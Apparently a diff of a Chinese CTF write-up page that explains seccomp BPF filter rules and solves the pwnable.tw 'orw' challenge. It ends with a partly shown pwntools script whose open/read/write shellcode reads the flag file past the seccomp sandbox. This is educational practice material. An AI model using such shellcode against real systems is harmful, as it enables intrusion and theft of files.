+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_STMT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BPF_JUMP</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//首先指定操作的类别</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LD		0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LDX		0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ST		0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_STX		0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ALU		0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JMP		0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_RET		0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MISC    0x07</span><br>	<br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//在ld时指定操作数的大小</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_W		0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_H		0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_B		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//操作数类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_IMM		0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ABS		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_IND		0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MEM		0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LEN		0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MSH		0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//当操作码类型为ALU时，指定具体运算符</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ADD		0x00                    <span class="hljs-comment">//到底执行什么操作可以看filter.h里面的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_SUB		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MUL		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_DIV		0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_OR		0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_AND		0x50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LSH		0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_RSH		0x70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_NEG		0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MOD		0x90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_XOR		0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JA		0x00                    <span class="hljs-comment">//当操作码类型是JMP时指定跳转类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JEQ		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JGT		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JGE		0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_K		0x00                    <span class="hljs-comment">//常数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_X		0x08</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)         <span class="hljs-comment">//首先指定操作的类别</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LD		0x00                    <span class="hljs-comment">//将值cp进寄存器</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LDX		0x01</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ST		0x02</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_STX		0x03</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ALU		0x04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JMP		0x05</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_RET		0x06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MISC    0x07</span><br>	<br><span class="hljs-comment">/* ld/ldx fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)         <span class="hljs-comment">//在ld时指定操作数的大小</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_W		0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_H		0x08</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_B		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)         <span class="hljs-comment">//操作数类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_IMM		0x00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ABS		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_IND		0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MEM		0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LEN		0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MSH		0xa0</span><br><br><span class="hljs-comment">/* alu/jmp fields */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)         <span class="hljs-comment">//当操作码类型为ALU时，指定具体运算符</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_ADD		0x00                    <span class="hljs-comment">//到底执行什么操作可以看filter.h里面的定义</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_SUB		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MUL		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_DIV		0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_OR		0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_AND		0x50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_LSH		0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_RSH		0x70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_NEG		0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_MOD		0x90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_XOR		0xa0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JA		0x00                    <span class="hljs-comment">//当操作码类型是JMP时指定跳转类型</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JEQ		0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JGT		0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JGE		0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_JSET        0x40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)         </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_K		0x00                    <span class="hljs-comment">//常数</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>		BPF_X		0x08</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> &#123;</span><br>    <span class="hljs-type">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (在 &lt;linux/audit.h&gt; 里) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_data</span> &#123;</span><br>    <span class="hljs-type">int</span>   nr;                   <span class="hljs-comment">/* System call number */</span><br>    __u32 arch;                 <span class="hljs-comment">/* AUDIT_ARCH_* value</span><br><span class="hljs-comment">                                  (在 &lt;linux/audit.h&gt; 里) */</span><br>    __u64 instruction_pointer;  <span class="hljs-comment">/* CPU instruction pointer */</span><br>    __u64 args[<span class="hljs-number">6</span>];              <span class="hljs-comment">/* Up to 6 system call arguments */</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据</span><br><span class="hljs-comment">//或者</span><br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据</span><br><span class="hljs-comment">//或者</span><br>BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>而跳转语句写法如下：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)               <br><span class="hljs-comment">//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="hljs-number">59</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)               <br><span class="hljs-comment">//这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。<br>最后当验证完成需要返回结果，即是否允许：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。<br>总结一下：</p>
 <ol>
@@ -388,111 +712,398 @@
 <li><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</li>
 </ol>
 <p>例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),          <span class="hljs-comment">// 从第0个字节位置开始，加载读取系统调用号</span><br>    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="hljs-number">257</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),       <span class="hljs-comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span><br>    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),         <span class="hljs-comment">// 比较系统调用号是否大于 0，是就跳到第6行</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="hljs-comment">// 拒绝系统调用，返回 0</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="hljs-comment">// 允许系统调用</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),          <span class="hljs-comment">// 从第0个字节位置开始，加载读取系统调用号</span><br>    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="hljs-number">257</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),       <span class="hljs-comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span><br>    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),         <span class="hljs-comment">// 比较系统调用号是否大于 0，是就跳到第6行</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="hljs-comment">// 拒绝系统调用，返回 0</span><br>    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="hljs-comment">// 允许系统调用</span><br>&#125;;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>拿本题的sock_filter结构体说明一下：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00050026</span>  <span class="hljs-keyword">return</span> ERRNO(<span class="hljs-number">38</span>)<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>line 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。<br>line 8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。</p>
 <h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><p>经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。<br>老规矩，检查一下文件的保护机制：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww<br>[*] <span class="hljs-string">'/mnt/hgfs/PWN\xe9\xa2\x98/Range/pwnable.xyz/orww'</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww<br>[*] <span class="hljs-string">'/mnt/hgfs/PWN\xe9\xa2\x98/Range/pwnable.xyz/orww'</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>可以看到程序为32位，只开启了NX保护。main函数如下：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  orw_seccomp();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give my your shellcode:"</span>);<br>  read(<span class="hljs-number">0</span>, &amp;shellcode, <span class="hljs-number">0xC8</span>u);<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))shellcode)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>很简单，输入shellcode之后程序就会执行它。<br>还有一个问题，system和execve都被禁用了怎么办？<br>读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。<br>同时题目已经给予了这个提示：</p>
 <p>因此这里考验我们直接编写shellcode的能力，这里注意<br>• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。<br>• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。<br>由于这道题是32位程序，因此编写shellcode如下：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>context.log_level=<span class="hljs-string">"debug"</span><br>p = remote(<span class="hljs-string">'chall.pwnable.tw'</span>, <span class="hljs-number">10001</span>)<br><br>shellcode_open = <span class="hljs-string">'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'</span><br>shellcode_read = <span class="hljs-string">'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'</span><br>shellcode_write = <span 